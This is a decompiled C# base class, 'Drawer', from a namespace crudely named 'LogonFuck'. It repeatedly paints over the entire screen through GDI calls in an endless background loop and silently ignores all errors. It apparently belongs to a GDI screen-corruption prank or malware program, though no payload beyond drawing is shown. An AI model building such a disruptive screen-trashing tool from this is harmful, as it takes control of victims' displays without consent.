using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace LogonFuck
{
	// Token: 0x02000007 RID: 7
	internal abstract class Drawer
	{
		// Token: 0x06000018 RID: 24
		[DllImport("User32.dll")]
		protected static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x06000019 RID: 25
		[DllImport("User32.dll")]
		protected static extern void ReleaseDC(IntPtr hWnd, IntPtr hDc);

		// Token: 0x0600001A RID: 26
		[DllImport("gdi32.dll")]
		protected static extern IntPtr CreateSolidBrush(uint crColor);

		// Token: 0x0600001B RID: 27
		[DllImport("gdi32.dll")]
		protected static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

		// Token: 0x0600001C RID: 28
		[DllImport("gdi32.dll")]
		protected static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

		// Token: 0x0600001D RID: 29
		[DllImport("gdi32.dll")]
		protected static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, CopyPixelOperation dwRop);

		// Token: 0x0600001E RID: 30
		[DllImport("gdi32.dll")]
		protected static extern bool DeleteObject([In] IntPtr hObject);

		// Token: 0x0600001F RID: 31
		[DllImport("gdi32.dll")]
		protected static extern bool PlgBlt(IntPtr hdcDest, Point[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

		// Token: 0x06000020 RID: 32 RVA: 0x000026EB File Offset: 0x000008EB
		public Drawer(int delay)
		{
			this.delay = delay;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x000026FA File Offset: 0x000008FA
		public void Start()
		{
			if (this.thread == null)
			{
				this.thread = new Thread(new ThreadStart(this.StartDraw));
				this.thread.Start();
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00002728 File Offset: 0x00000928
		private void StartDraw()
		{
			for (;;)
			{
				try
				{
					IntPtr dc = Drawer.GetDC(IntPtr.Zero);
					try
					{
						this.Draw(dc);
					}
					catch
					{
					}
					Drawer.ReleaseDC(IntPtr.Zero, dc);
				}
				catch
				{
				}
				Thread.Sleep(this.delay);
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002788 File Offset: 0x00000988
		public void Stop()
		{
			this.thread.Abort();
			this.thread = null;
		}

		// Token: 0x06000024 RID: 36
		protected abstract void Draw(IntPtr hdc);

		// Token: 0x04000012 RID: 18
		protected static int screenWidth = Screen.PrimaryScreen.Bounds.Width;

		// Token: 0x04000013 RID: 19
		protected static int screenHeight = Screen.PrimaryScreen.Bounds.Height;

		// Token: 0x04000014 RID: 20
		protected static Random random = new Random();

		// Token: 0x04000015 RID: 21
		protected Thread thread;

		// Token: 0x04000016 RID: 22
		public int delay;
	}
}
